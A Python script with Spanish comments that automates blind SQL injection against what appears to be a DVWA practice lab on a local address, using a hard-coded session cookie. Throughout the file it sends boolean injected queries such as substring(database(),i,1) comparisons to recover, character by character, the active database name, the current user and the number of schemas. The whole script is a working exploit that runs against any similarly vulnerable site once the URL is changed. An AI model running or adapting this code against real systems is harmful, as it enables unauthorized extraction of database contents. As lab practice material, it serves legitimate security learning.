#!/usr/bin/env python3

import requests

cookies =  {
	"PHPSESSID": "btus001er4quh49vpqobnhdj45",
	"security": "low"
}

url = "http://10.0.2.3/vulnerabilities/sqli_blind/?id="
payload = "0&Submit=Submit#"

r = requests.get(url + payload, cookies=cookies)
DEFAULT_SIZE = len(r.text)

def find_active_db() -> str:
	size = DEFAULT_SIZE
	db_len = 0
	db_name = []
	i = 1

	print("--> Encontrando longitud de la base de datos activa...")
	r = requests.get(url + payload, cookies=cookies)

	# Sacar longitud del nombre
	while "First name" not in r.text:
		r = requests.get(f"{url}1' and (select length(database()))={i} -- -&Submit=Submit#", cookies=cookies)
		size = len(r.text)
		i += 1

	db_len = i - 1

	print(f"--> La base de datos activa tiene {db_len} carácteres")

	print("--> Sacando nombre de la base de datos...")

	# Sacar nombre de bbdd

	i = 1
	char = 0

	while i <= db_len:
		r = requests.get(f"{url}1' and (select substring(database(),{i},1))='{chr(char)}' -- -&Submit=Submit#", cookies=cookies)

		if "First name" in r.text:
			db_name.append(chr(char))
			print(f"\r{''.join(db_name)}", end='')
			i += 1
			char = 0
		else:
			char += 1

	return db_name

def find_user():
	size = DEFAULT_SIZE
	user_len = 0
	user_name = []
	i = 1

	print("--> Encontrando longitud de usuario activo...")
	r = requests.get(url + payload, cookies=cookies)

	# Sacar longitud del nombre
	while "First name" not in r.text:
		r = requests.get(f"{url}1' and (select length(user()))={i} -- -&Submit=Submit#", cookies=cookies)
		size = len(r.text)
		i += 1

	user_len = i - 1

	print(f"--> El usuario activo tiene {user_len} carácteres")

	print("--> Sacando nombre del usuario activo...")

	i = 1
	char = 0

	while i <= user_len:
		r = requests.get(f"{url}1' and (select substring(user(),{i},1))='{chr(char)}' -- -&Submit=Submit#", cookies=cookies)

		if "First name" in r.text:
			user_name.append(chr(char))
			print(f"\r{''.join(user_name)}", end='')
			i += 1
			char = 0
		else:
			char += 1

	print(f"--> Nombre de usuario: {''.join(user_name)}")


def find_n_db() -> int:

	i = 0
	r = requests.get(url + payload, cookies=cookies)

	while "First name" not in r.text:
		i += 1
		r = requests.get(f"{url}1' and (select count(schema_name) from information_schema.schemata)={i} -- -&Submit=Submit#", cookies=cookies)
		size = len(r.text)
		
	return i

	# 1' and (select count(schema_name) from information_schema.schemata)=1 -- -

def main():
	r = requests.get(url, cookies=cookies)
	db_name = find_active_db()
	print(f"--> Active db: {''.join(db_name)}")
	#find_db()
	#find_user()
	n_db = find_n_db()
	print(f"--> {n_db} dbs found")


if __name__ == '__main__':
	main()